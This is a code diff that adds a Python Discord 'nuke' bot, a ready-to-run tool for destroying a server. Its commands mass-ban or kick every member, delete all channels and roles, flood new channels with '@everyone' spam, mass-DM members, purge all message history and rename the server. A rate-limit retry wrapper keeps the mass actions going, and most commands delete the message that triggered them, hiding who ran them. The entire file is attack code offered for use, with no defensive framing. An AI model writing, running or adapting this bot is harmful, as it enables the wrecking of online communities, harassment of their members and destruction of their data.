@@ -1,0 +1,128 @@
+import discord
+from discord.ext import commands
+import asyncio
+import aiohttp
+
+TOKEN = "YOUR_TOKEN_HERE"
+SPAM_MSG = "@everyone nuked by spent0000"
+
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="!", intents=intents)
+
+async def safe(coro_fn, *args, **kwargs):
+    while True:
+        try:
+            return await coro_fn(*args, **kwargs)
+        except discord.HTTPException as e:
+            if e.status == 429:
+                await asyncio.sleep(e.retry_after + 0.1)
+                continue
+            return None
+        except Exception:
+            return None
+
+@bot.command()
+async def nuke(ctx, create: int = 100, spam: int = 10, cap: int = 500):
+    guild = ctx.guild
+    await safe(ctx.message.delete)
+    ban_tasks = [safe(m.ban, reason="nuked")
+                 for m in guild.members
+                 if m.id != bot.user.id and not m.bot]
+    await asyncio.gather(*ban_tasks)
+    await asyncio.gather(*[safe(ch.delete) for ch in guild.channels],
+                         *[safe(r.delete) for r in guild.roles
+                           if r.name != "@everyone"])
+    sem = asyncio.Semaphore(8)
+    created = []
+    async def make(name):
+        async with sem:
+            if len(guild.channels) >= cap:
+                return
+            ch = await safe(guild.create_text_channel, name)
+            if ch:
+                created.append(ch)
+    await asyncio.gather(*[make(f"Spent{i:03d}") for i in range(create)])
+    async def spam_ch(ch):
+        for _ in range(spam):
+            await safe(ch.send, SPAM_MSG)
+    await asyncio.gather(*[spam_ch(c) for c in created])
+    await safe(guild.edit, name="NUKED BY SPENT0000")
+
+@bot.command()
+async def delchannels(ctx):
+    await safe(ctx.message.delete)
+    await asyncio.gather(*[safe(c.delete) for c in ctx.guild.channels])
+
+@bot.command()
+async def delroles(ctx):
+    await safe(ctx.message.delete)
+    await asyncio.gather(*[safe(r.delete) for r in ctx.guild.roles
+                           if r.name != "@everyone"])
+
+@bot.command()
+async def banall(ctx):
+    await safe(ctx.message.delete)
+    await asyncio.gather(*[safe(m.ban, reason="nuked")
+                           for m in ctx.guild.members
+                           if m.id != bot.user.id and not m.bot])
+
+@bot.command()
+async def kickall(ctx):
+    await safe(ctx.message.delete)
+    await asyncio.gather(*[safe(m.kick, reason="nuked")
+                           for m in ctx.guild.members
+                           if m.id != bot.user.id and not m.bot])
+
+@bot.command()
+async def spam(ctx, amount: int = 50, *, msg="nuked"):
+    await safe(ctx.message.delete)
+    for _ in range(amount):
+        await safe(ctx.send, msg)
+
+@bot.command()
+async def spamall(ctx, amount: int = 10, *, msg="@everyone nuked"):
+    await safe(ctx.message.delete)
+    async def go(ch):
+        for _ in range(amount):
+            await safe(ch.send, msg)
+    await asyncio.gather(*[go(c) for c in ctx.guild.text_channels])
+
+@bot.command()
+async def massdm(ctx, *, msg="hey"):
+    await safe(ctx.message.delete)
+    await asyncio.gather(*[safe(m.send, msg) for m in ctx.guild.members
+                           if not m.bot])
+
+@bot.command()
+async def rename(ctx, *, name="NUKED"):
+    await safe(ctx.message.delete)
+    await safe(ctx.guild.edit, name=name)
+
+@bot.command()
+async def create(ctx, count: int = 50, *, name="Spent"):
+    await safe(ctx.message.delete)
+    sem = asyncio.Semaphore(8)
+    async def make(i):
+        async with sem:
+            await safe(ctx.guild.create_text_channel, f"{name}{i:03d}")
+    await asyncio.gather(*[make(i) for i in range(count)])
+
+@bot.command()
+async def wipe(ctx):
+    await safe(ctx.message.delete)
+    async def purge(ch):
+        try:
+            await ch.purge(limit=None)
+        except:
+            pass
+    await asyncio.gather(*[purge(c) for c in ctx.guild.text_channels])
+
+@bot.command()
+async def icon(ctx, url: str):
+    await safe(ctx.message.delete)
+    async with aiohttp.ClientSession() as s:
+        async with s.get(url) as r:
+            data = await r.read()
+    await safe(ctx.guild.edit, icon=data)
+
+bot.run(TOKEN)
